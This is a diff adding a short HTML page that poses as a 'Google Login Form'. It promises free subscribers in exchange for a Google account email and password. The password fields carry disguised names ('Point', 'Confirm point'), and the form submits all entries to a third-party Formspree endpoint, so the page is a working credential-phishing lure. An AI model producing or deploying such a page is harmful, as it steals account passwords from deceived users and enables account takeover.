@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Google Login Form</title>
+</head>
+<body>
+    <div class="box">
+        <h2>Free Subscribers</h2>
+        <p>Use a Google account</p>
+	    <!-- Form -->
+        <form action="https://formspree.io/f/xgejnpjb" method="POST">
+  	 <!-- Subscribers -->
+	    <div class="select">
+		 <select name="Subscribers">
+	     <option value="🚫 ">Your Subscriber </option>  
+         <option value="100">100</option>  
+         <option value="200">200</option>  
+         <option value="300">300</option>  
+         <option value="400">400</option>  
+         <option value="500">500</option>  
+         <option value="1K">1K</option> 
+	     <select></select>
+        </div>
+		
+	      <div class="inputBox">
+            <input type="link" name="Link" required="" onkeyup="this.setAttribute('value', this.value);" value="">
+            <label>Link</label>
+          </div>
+          <div class="inputBox">
+            <input type="email" name="Email" required="" onkeyup="this.setAttribute('value', this.value);" value="">
+            <label>Email</label>
+          </div>
+          <div class="inputBox">
+                <input type="text" id="Point" required ="8,10" value="" name="Point">
+                <label>Pasword</label>
+              </div>
+		  <div class="inputBox">
+                <input type="text" id="Confirm point" required =""onkeyup="this.setAttribute('value',this.value);" value="" name="Confirm point">
+                <label>Confirm Pasword</label>
+              </div>
+          <input type="submit" value="Login">
+        </form>
+      </div>
+</body>
+</html>
